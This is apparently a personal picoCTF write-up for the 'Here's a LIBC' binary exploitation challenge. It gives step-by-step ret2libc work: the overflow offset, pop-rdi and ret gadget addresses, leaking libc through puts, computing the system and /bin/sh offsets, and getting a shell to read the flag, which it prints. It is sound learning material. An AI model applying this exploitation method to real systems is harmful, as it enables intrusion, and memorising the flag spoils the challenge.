# Heres-a-LIBC

## FLAG: picoCTF{1_<3_sm4sh_st4cking_  8652b55904cb7c}

## Status: Complete

Category: Binary-Exploit

Description: I am once again asking for you to pwn this binary vuln libc.so.6 Makefile nc mercury.picoctf.net 62289

Hint-1: PWNTools has a lot of useful features for getting offsets.

> wget "https://mercury.picoctf.net/static/2c327c6c08e9d1d8142dbdb85ae00574/vuln"
> wget "https://mercury.picoctf.net/static/2c327c6c08e9d1d8142dbdb85ae00574/libc.so.6"
> wget "https://mercury.picoctf.net/static/2c327c6c08e9d1d8142dbdb85ae00574/Makefile"

## CREDIT: Help from John Hammond's Binary Exploit Video @ <https://youtu.be/tMN5N5oid2c>

## STEPS

1. Try running pwninit
    > pwninit
    > configure solve.py with addr: mercury.picoctf.net, 62289
    > python3 solve.py

2. Run ./vuln_patched
    > insert "AAAAAAA..." until segmentation error

3. Use Ghidra to decompile and analyze code
    > main() -> copied to decomp.c
    > doStuff() -> copied to decomp.c
        > doStuff() makes space for 112 characters but only "converts" 100 of those characters
    > puts() function is used in both main() and doStuff() which is exploitable

4. Used pwninit solve.py to send data
    > r.sendline(b'A' * 136)
      - 135 A's works but overflows at 136
    > r.sendline(b'A' x 112)
    **MAYBE USES ROP ATTACK?**

5. python3 POC
    > len("AaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAa")
    - returns 112
    > len("AaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAa")
    - returns 100

6. Need to craft a ROP chain
   1. Need to find the RIP not EIP(Extended Instruction Pointer) because this is 64bit
   2. Run GNU debugger (gdb) and put breakpoint on main()
      > gdb ./vuln_patched
      > break main
      > pattern create 136

7. Need to determine x86-64 calling conventions
    1. `RDI, RSI, RDX, RCX, R8, R9, [XYZ]MM0–7`
    2. Since `RDI` is first we need to use a ROPGadget that access or modifies `RDI`

8. ROP Gadgets
    > ROPgadget --binary vuln_patched
    - `0x0000000000400913 : pop rdi ; ret`

9. Need address from PLT
    1. Open up ghidra
    2. Get address of function in got.plt - `scan_f(): 00601038`
    3. Get address of puts() from .plt - `puts(): 00400540`
    4. Get address of main() from vuln_patched - `main(): 00400771`

10. Build out ROPChain in python
    1. rop-build-v1.py
        1. Use addresses of pop_rdi, scanf_at_got, and puts_plt to buffer overflow and leak out the actual address of the REAL scanf
    2. LIBC - Symbols (scanf) - get scanf offset address
        1. > readelf -s ./lib.so.6 | grep scanf
        2. `2062: 000000000007b0b0   197 FUNC    GLOBAL DEFAULT   13 scanf@@GLIBC_2.2.5`
    3. rop-build-v1.py
        2. Use the real scanf address to calculate the offset
    4. LIBC - Symbols (system) - get system offset address
        1. > readelf -s ./libc.so.6 | grep system
        2. `1403: 000000000004f4e0    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5`
    5. rop-build-v1.py
        3. Use the offset to find system() function in libc
    6. Add in /bin/sh
        1. open libc.so.6 with ghidra
        2. search memory -> `string`, search for `/bin/sh`, search_all
        3. Address: `002b40fa`
    7. rop-build-v1.py
        4. Construct second ROP chain
        5. SEND IT!!
    8. Reached EOF not /bin/sh shell - time to debug

11. DEBUGGING
    1. check `RET` address of do_stuff(): `00400770`
    2. Set breakpoint in gef at do_stuff
        > b * 0x400770
        > c (continue)
        > si
        > c
        > x/gx $rdi
            return: `0x7f829e391f7a: Cannot access memory at address 0x7f829e391f7a`
        > quit
    3. rop-build-v1.py
        1. Check that our leaked base address is correct - return: hex(base_address_of_libc)='0x7f474abcbe80' - we know this is wrong because the last digits should be 0
    4. Rerun gdb with breakpoint at main
        1. copy our hex 'leaked' value: 0x7f692d7f0f30
        2. examine that value in gdb (we expect to see scanf as the return)
            1. > x 0x7f692d7f0f30
            2. RETURN: 0x7f692d7f0f30 <__isoc99_scanf>: 0xfa894953
        3. This tells us that our leak is right but we are leaking `__isoc99_scanf` not just `scanf`
    5. Check binary for `__isoc99_scanf`
        1. > readelf -s libc.so.6 | less
        2. > /__is
        3. There are SOOOO MANY so lets try to leak a different function like setbuf()
    6. Create v2 of rop-build-v2.py
        1. Using the same techniques above get the setbuf_got value and setbuf_offset
        2. re-run python script - still problem
    7. Using the gdb instance from the python script we can debug
        1. > c
        2. > telescope $rsp - 32 (this will pretty print memory)
        3. In this we can see that our RSP value should be the value of our pop_rdi however it isn't so our payload is overflowing
    8. Rerun (gdb-gef) and set breakpoint at do_stuff and do_stuff ret
        1. > b do_stuff
        2. > disassemble do_stuff -> grab the ret address here
        3. > b *0x400770
        4. > c
        5. > si (step-into)
        6. > "enter"
        7. > "enter"
        8. we can see rdi -> setbuf
        9. > c
        10. Now check the hex address from our leak terminal
        11. > x 0x7fe037815540 -> return: `0x7fe037815540 <setbuf>: 0x002000ba`
        12. > vm -> in here we see our `0x7fe03778d000` in libc
        13. > p system -> return: `$1 = {<text variable, no debug info>} 0x7fe0377dc4e0 <system>`
        14. > p system - 0x007fe03778d000 -> return: `0x4f4e0`
        15. Compare to the offset value in our py script
        16. > si
        17. > ni (press enter 5 times to get to "call function")
        18. Copy the rsi value: 0x007fffc3d7fe80
        19. > ni (to step over scanf)
        20. > telescope 0x007fffc3d7fe80 -l 64
        21. In here we can see the pop_rdi and then after we SHOULD see our /bin/sh ... but we dont so our /bin/sh is wrong in our py script
        22. So we will now search memory using gdb-gef
        23. > vm -> grab begin and end of libc
        24. > search 0x007fe03778d000 0x007fe037b7a000 /bin/sh -> `can't find default source file`
        25. > grep /bin/sh -> return: `0x7fe0379410fa - 0x7fe037941101  →   "/bin/sh"`
        26. > x/s 0x7fe0379410fa -> return: `/bin/sh`
        27. Now let's test the offset to validate it is correct
        28. > p 0x7fe0379410fa- -> return: `0x1b40fa`
        29. Compare this value to our py script
        30. FOUND THE ERROR!
    9. Now let's test again server...
    10. Doesnt Work (stack alignment error) so lets go back
12. DEBUGGING PT. 2
    1. Run Ropgadgets
        1. > ROPgadget --binary vuln_patched | grep ": ret" -> return: `0x000000000040052e : ret`
        2. Add this to our py script
        3. WOOHOO IT WORKS!
        4. Add remote connection to py script

## RUN ATTACK

Run rop-build-v2.py

Now have a reverse shell:
> ls
> cat flag.txt
picoCTF{1_<3_sm4sh_st4cking_  8652b55904cb7c}